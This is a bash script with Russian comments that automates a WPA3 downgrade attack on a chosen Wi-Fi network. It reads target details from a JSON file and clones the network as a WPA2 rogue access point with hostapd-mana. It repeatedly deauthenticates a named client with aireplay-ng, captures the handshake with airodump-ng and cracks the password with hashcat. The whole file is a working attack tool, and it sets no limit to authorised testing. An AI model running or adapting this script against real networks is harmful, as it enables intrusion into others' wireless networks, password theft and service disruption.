#!/bin/bash
#
# dragonshift.sh - WPA3 Downgrade Attack (Rogue AP + Periodic Deauth) + Auto-crack
#
# Результаты сохраняются в: wifi_data/dragonshift/

set -euo pipefail

if [ $# -lt 5 ]; then
    echo "Usage: $0 <json_config> --iface-ap <ap_interface> --iface-mon <mon_interface> <timeout_seconds>" >&2
    exit 1
fi

JSON_FILE="$1"
shift

AP_IFACE=""
MON_IFACE=""
TIMEOUT=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --iface-ap) AP_IFACE="$2"; shift 2 ;;
        --iface-mon) MON_IFACE="$2"; shift 2 ;;
        *) TIMEOUT="$1"; shift ;;
    esac
done

if [ -z "$AP_IFACE" ] || [ -z "$MON_IFACE" ] || [ -z "$TIMEOUT" ]; then
    echo "ERROR: Missing parameters" >&2
    exit 1
fi

if ! [[ "$TIMEOUT" =~ ^[0-9]+$ ]]; then
    echo "ERROR: Timeout must be integer" >&2
    exit 1
fi

if [ ! -f "$JSON_FILE" ]; then
    echo "ERROR: JSON file not found: $JSON_FILE" >&2
    exit 1
fi

WORDLIST="./wordlists/wordlist.txt"
if [ ! -f "$WORDLIST" ]; then
    echo "ERROR: Wordlist not found: $WORDLIST" >&2
    exit 1
fi

# Парсинг JSON
BSSID=$(jq -r '.bssid' "$JSON_FILE")
ESSID=$(jq -r '.essid' "$JSON_FILE")
CHANNEL=$(jq -r '.channel' "$JSON_FILE")
CLIENT_MAC=$(jq -r '.clients[0].mac' "$JSON_FILE")

if [ "$BSSID" = "null" ] || [ "$ESSID" = "null" ] || [ "$CHANNEL" = "null" ] || [ "$CLIENT_MAC" = "null" ]; then
    echo "ERROR: Missing required fields in JSON" >&2
    exit 1
fi

# Пути
DOCKER_IMAGE="wifi:latest"
DATA_DIR="wifi_data"
DRAGONSHIFT_DIR="$DATA_DIR/dragonshift"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
PCAP_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift.cap"
HC22000_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift.hc22000"
CRACKED_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift_cracked.txt"

mkdir -p "$DRAGONSHIFT_DIR"

# Проверка интерфейсов
check_interface_exists() {
    docker run --rm --net=host --cap-drop=ALL --cap-add=NET_ADMIN --cap-add=NET_RAW \
        $DOCKER_IMAGE ip link show "$1" >/dev/null 2>&1
    return $?
}

if ! check_interface_exists "$AP_IFACE" || ! check_interface_exists "$MON_IFACE"; then
    echo "ERROR: Interface not found" >&2
    exit 1
fi

# Конфиг hostapd-mana
HOSTAPD_CONF="/tmp/hostapd-mana-${TIMESTAMP}.conf"
cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
driver=nl80211
hw_mode=g
channel=$CHANNEL
ssid=$ESSID
bssid=$BSSID
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=12345678
EOF

echo "Starting WPA3 Downgrade Attack" >&2
echo "Target: $ESSID ($BSSID) channel $CHANNEL" >&2
echo "AP iface: $AP_IFACE" >&2
echo "Mon iface: $MON_IFACE" >&2
echo "Timeout: $TIMEOUT s" >&2
echo "Results directory: $DRAGONSHIFT_DIR" >&2

# 1. Rogue AP
docker run --rm -d \
    --name "hostapd-mana-${TIMESTAMP}" \
    --net=host \
    --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_MODULE \
    --cpus="0.5" --memory="512m" \
    -v "$HOSTAPD_CONF:/etc/hostapd-mana.conf:ro" \
    $DOCKER_IMAGE \
    hostapd-mana /etc/hostapd-mana.conf

# 2. airodump-ng
docker run --rm -d \
    --name "airodump-${TIMESTAMP}" \
    --net=host \
    --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_MODULE \
    --cpus="0.5" --memory="512m" \
    -v "$(pwd)/$DRAGONSHIFT_DIR:/capture" \
    $DOCKER_IMAGE \
    timeout --signal=INT ${TIMEOUT}s \
    airodump-ng --bssid $BSSID -c $CHANNEL -w /capture/capture --output-format cap $MON_IFACE

# 3. Deauth
echo "Starting periodic deauthentication (5 packets every 10 seconds)..." >&2
(
    START_TIME=$(date +%s)
    while [ $(( $(date +%s) - START_TIME )) -lt "$TIMEOUT" ]; do
        docker run --rm \
            --net=host \
            --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_MODULE \
            $DOCKER_IMAGE \
            aireplay-ng -0 5 -a $BSSID -c $CLIENT_MAC $MON_IFACE >/dev/null 2>&1 || true
        
        sleep 20
    done
) &

AIREPLAY_BG_PID=$!

# Ждём
echo "Attack running for $TIMEOUT seconds..." >&2
sleep $TIMEOUT

# Остановка
echo "Stopping attack components..." >&2
docker kill "hostapd-mana-${TIMESTAMP}" "airodump-${TIMESTAMP}" 2>/dev/null || true
kill $AIREPLAY_BG_PID 2>/dev/null || true
wait 2>/dev/null || true

# Копируем .cap файл
CAP_CAPTURED=$(ls "$DRAGONSHIFT_DIR"/capture*.cap 2>/dev/null | head -1)
if [ -n "$CAP_CAPTURED" ]; then
    mv "$CAP_CAPTURED" "$PCAP_FILE"
    echo "Captured traffic saved: $PCAP_FILE" >&2
    SIZE=$(du -h "$PCAP_FILE" | cut -f1)
    echo "Capture size: $SIZE" >&2
else
    echo "WARNING: No capture file created" >&2
    rm -f "$HOSTAPD_CONF"
    exit 0
fi

rm -f "$HOSTAPD_CONF"

# Конвертация .cap в .hc22000 (от root — нормально)
if [ -s "$PCAP_FILE" ]; then
    echo "Converting .cap to .hc22000 with hcxpcapngtool..." >&2
    docker run --rm \
        -v "$(pwd)/$DRAGONSHIFT_DIR:/dragonshift" \
        $DOCKER_IMAGE \
        hcxpcapngtool -o "/dragonshift/${TIMESTAMP}_dragonshift.hc22000" "/dragonshift/${TIMESTAMP}_dragonshift.cap" 2>&1 | grep -v -E "summary|file name|version|timestamp|duration|used|link|endianness|packets|ESSID|BEACON|ACTION|PROBERESPONSE|DEAUTHENTICATION|AUTHENTICATION|ASSOCIATIONREQUEST|REASSOCIATIONREQUEST|WPA|EAPOL|EAPOLTIME|EAPOL ANONCE|EAPOL M1|EAPOL M2|EAPOL M3|EAPOL M4|EAPOL pairs|session summary|processed|Information:|Warning:|https:"

    if [ -f "$HC22000_FILE" ] && [ -s "$HC22000_FILE" ]; then
        echo "Valid hash(es) extracted! Starting hashcat -m 22000..." >&2
        docker run --rm \
            -v "$(pwd)/$DRAGONSHIFT_DIR:/dragonshift" \
            -v "$(pwd)/wordlists:/wordlists:ro" \
            $DOCKER_IMAGE \
            hashcat -m 22000 "/dragonshift/${TIMESTAMP}_dragonshift.hc22000" /wordlists/wordlist.txt -o "/dragonshift/${TIMESTAMP}_dragonshift_cracked.txt" --force

        chmod -R 644 "$DRAGONSHIFT_DIR"/* 2>/dev/null || true

        if [ -f "$CRACKED_FILE" ] && [ -s "$CRACKED_FILE" ]; then
            echo "PASSWORD FOUND!" >&2
            echo "Saved to: $CRACKED_FILE" >&2
        else
            echo "No password found in wordlist" >&2
        fi
    else
        echo "No valid hashes extracted from capture" >&2
    fi
else
    echo "WARNING: Capture file is empty" >&2
fi

echo "Downgrade attack finished." >&2